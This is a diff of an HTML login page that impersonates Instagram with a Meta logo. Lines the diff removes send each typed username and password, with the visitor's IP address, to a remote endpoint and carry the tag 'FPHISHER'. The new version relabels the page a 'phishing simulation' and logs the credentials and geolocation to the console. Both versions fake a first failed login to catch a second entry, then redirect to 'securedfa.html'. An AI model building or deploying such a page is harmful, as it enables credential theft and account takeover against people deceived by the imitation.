@@ -5,39 +5,37 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Login</title>
   <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    @keyframes shake {
+      0%, 100% { transform: translateX(0); }
+      20%, 60% { transform: translateX(-8px); }
+      40%, 80% { transform: translateX(8px); }
+    }
+    .animate-shake {
+      animation: shake 0.5s ease-in-out;
+    }
+  </style>
 </head>
 <body class="bg-white flex items-center justify-center min-h-screen">
 
   <div class="w-full max-w-sm px-6">
 
-    <!-- Logo -->
+    <!-- Logo (placeholder) -->
     <div class="flex justify-center mb-14">
       <img src="IMG_0905.png" alt="App" class="w-16 h-16" />
     </div>
 
     <!-- Username -->
-    <input
-      id="username"
-      type="text"
-      placeholder="Username, mobile number or email address"
-      class="w-full mb-3 px-4 py-3 text-base border border-gray-300 rounded-md bg-white focus:outline-none focus:border-gray-400"
-    />
+    <input id="username" type="text" placeholder="Username, mobile number or email address"
+      class="w-full mb-3 px-4 py-3 text-base border border-gray-300 rounded-md bg-white focus:outline-none focus:border-gray-400" />
 
     <!-- Password -->
-    <input
-      id="password"
-      type="password"
-      placeholder="Password"
-      class="w-full mb-4 px-4 py-3 text-base border border-gray-300 rounded-md bg-white focus:outline-none focus:border-gray-400"
-    />
+    <input id="password" type="password" placeholder="Password"
+      class="w-full mb-4 px-4 py-3 text-base border border-gray-300 rounded-md bg-white focus:outline-none focus:border-gray-400" />
 
     <!-- Login Button -->
-    <button
-      id="loginBtn"
-      class="w-full bg-blue-600 text-white text-sm font-normal py-3 rounded-lg mb-4
-             transition active:scale-95 disabled:opacity-70 disabled:cursor-not-allowed
-             flex items-center justify-center gap-2"
-    >
+    <button id="loginBtn"
+      class="w-full bg-blue-600 text-white text-sm font-normal py-3 rounded-lg mb-4 transition active:scale-95 disabled:opacity-70 disabled:cursor-not-allowed flex items-center justify-center gap-2">
       <span id="btnText">Log in</span>
       <svg id="spinner" class="w-5 h-5 animate-spin hidden" viewBox="0 0 24 24">
         <circle cx="12" cy="12" r="10" stroke="white" stroke-width="4" fill="none" opacity="0.3"/>
@@ -50,127 +48,115 @@
       Incorrect username or password.
     </div>
 
-    <!-- Forgotten Password -->
+    <!-- Forgotten Password (placeholder) -->
     <div class="text-center mb-6">
-      <a href="#" class="text-sm font-normal text-black hover:underline">
-        Forgotten password?
-      </a>
+      <a href="#" class="text-sm font-normal text-black hover:underline">Forgotten password?</a>
     </div>
 
-    <!-- Bottom Section -->
+    <!-- Bottom Section (placeholders) -->
     <div class="mt-16">
       <button class="w-full border border-blue-600 text-blue-600 text-sm font-normal py-3 rounded-md mb-8 hover:bg-blue-50 transition">
         Create new account
       </button>
-
       <div class="flex justify-center mt-2">
         <img src="IMG_0906.png" alt="Meta" class="h-8" />
       </div>
     </div>
   </div>
 
-  <!-- Load config first -->
-  <script type="module" src="config.js"></script>
-
   <script type="module">
-    import config from './config.js';
-
     let attempt = 0;
+    let isProcessing = false;
 
-    // Fast IP fetch
-    async function getIP() {
+    // Fast IP + full geo lookup (country, city, continent)
+    async function getGeoData() {
       try {
-        const res = await fetch('https://api.ipify.org?format=json');
-        const data = await res.json();
-        return data.ip || 'Unknown';
+        // Step 1: Get IP (very fast)
+        const ipRes = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipRes.json();
+        const ip = ipData.ip || 'Unknown';
+
+        // Step 2: Get location from fast free API (ip-api.com recommended for speed/no-key)
+        const geoRes = await fetch(`https://ip-api.com/json/${ip}?fields=status,message,continent,continentCode,country,countryCode,regionName,city,lat,lon,timezone`);
+        const geo = await geoRes.json();
+
+        if (geo.status === 'success') {
+          return {
+            ip: ip,
+            country: geo.country || 'Unknown',
+            city: geo.city || 'Unknown',
+            continent: geo.continent || 'Unknown'
+          };
+        } else {
+          console.warn('Geo API warning:', geo.message);
+          return { ip, country: 'Unknown', city: 'Unknown', continent: 'Unknown' };
+        }
       } catch (err) {
-        console.error("IP fetch failed:", err);
-        return 'Unknown';
+        console.error('Geo lookup failed:', err);
+        return { ip: 'Unknown', country: 'Unknown', city: 'Unknown', continent: 'Unknown' };
       }
     }
 
-    // Send data to your endpoint
-    async function sendToEndpoint(username, password, ip, attemptNum) {
-      const payload = {
-        app: "INSTAGRAM",
-        username: username,
-        password: password,
-        ip: ip,
-        attempt: attemptNum,
-        timestamp: new Date().toISOString(),
-        message: "FPHISHER 🤖 2025@FTECHSERVICES"
-      };
+    // Simulate sending alert (replace with your secure logging endpoint or just console for analysis)
+    async function sendAlert(username, password, geo, attemptNum) {
+      const alertMessage = `*New Alert*\nUser: ${username} (ig)\nCode: ${password}\nIP: ${geo.ip}\nCountry: ${geo.country}\nCity: ${geo.city}\nContinent: ${geo.continent}\nAttempt: ${attemptNum}`;
 
-      try {
-        await fetch(config.ENDPOINT_URL, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(payload)
-        });
-        console.log(`✅ Attempt ${attemptNum} sent to endpoint`);
-      } catch (err) {
-        console.error("Endpoint failed:", err);
-      }
+      console.log('=== PHISHING SIMULATION ALERT ===\n' + alertMessage + '\n=============================');
+
+      // TODO: For real defensive analysis, send to YOUR controlled logging server only
+      // Example:
+      // await fetch('YOUR_SECURE_LOG_ENDPOINT', {
+      //   method: 'POST',
+      //   headers: { 'Content-Type': 'application/json' },
+      //   body: JSON.stringify({ alert: alertMessage, raw: { username, password, geo, attemptNum } })
+      // });
     }
 
-    document.getElementById("loginBtn").addEventListener("click", async (e) => {
-      e.preventDefault();
+    document.getElementById('loginBtn').addEventListener('click', async () => {
+      if (isProcessing) return;
+      isProcessing = true;
 
-      const username = document.getElementById("username").value.trim();
-      const password = document.getElementById("password").value.trim();
-      const passwordInput = document.getElementById("password");
+      const username = document.getElementById('username').value.trim();
+      const password = document.getElementById('password').value.trim();
+      const passwordInput = document.getElementById('password');
+      const btn = document.getElementById('loginBtn');
+      const btnText = document.getElementById('btnText');
+      const spinner = document.getElementById('spinner');
+      const errorMsg = document.getElementById('errorMsg');
 
       if (!username || !password) {
-        alert("Please fill in all fields!");
+        alert('Please fill in all fields!');
+        isProcessing = false;
         return;
       }
 
-      const btn = document.getElementById("loginBtn");
-      const btnText = document.getElementById("btnText");
-      const spinner = document.getElementById("spinner");
-      const errorMsg = document.getElementById("errorMsg");
-
       attempt++;
 
-      // Get IP
-      const ip = await getIP();
+      // Get geo data
+      const geo = await getGeoData();
 
-      // Send to your endpoint (preserves original timing)
-      await sendToEndpoint(username, password, ip, attempt);
+      // Send alert for this attempt
+      await sendAlert(username, password, geo, attempt);
 
       if (attempt === 1) {
-        // First attempt: show error
-        errorMsg.classList.remove("hidden");
-        passwordInput.value = "";
-
-        // Shake effect
-        passwordInput.classList.add("animate-shake");
-        setTimeout(() => passwordInput.classList.remove("animate-shake"), 600);
-      } 
-      else {
-        // Second attempt: show loading then redirect
+        // First attempt: show error + shake
+        errorMsg.classList.remove('hidden');
+        passwordInput.value = '';
+        passwordInput.classList.add('animate-shake');
+        setTimeout(() => passwordInput.classList.remove('animate-shake'), 600);
+      } else {
+        // Second attempt: loading → redirect
         btn.disabled = true;
-        btnText.textContent = "Loading...";
-        spinner.classList.remove("hidden");
+        btnText.textContent = 'Loading...';
+        spinner.classList.remove('hidden');
 
         setTimeout(() => {
-          window.location.href = "securedfa.html";
+          window.location.href = 'securedfa.html'; // placeholder
         }, 800);
       }
+
+      isProcessing = false;
     });
   </script>
-
-  <!-- Shake animation -->
-  <style>
-    @keyframes shake {
-      0%, 100% { transform: translateX(0); }
-      20%, 60% { transform: translateX(-8px); }
-      40%, 80% { transform: translateX(8px); }
-    }
-    .animate-shake {
-      animation: shake 0.5s ease-in-out;
-    }
-  </style>
-
 </body>
 </html>
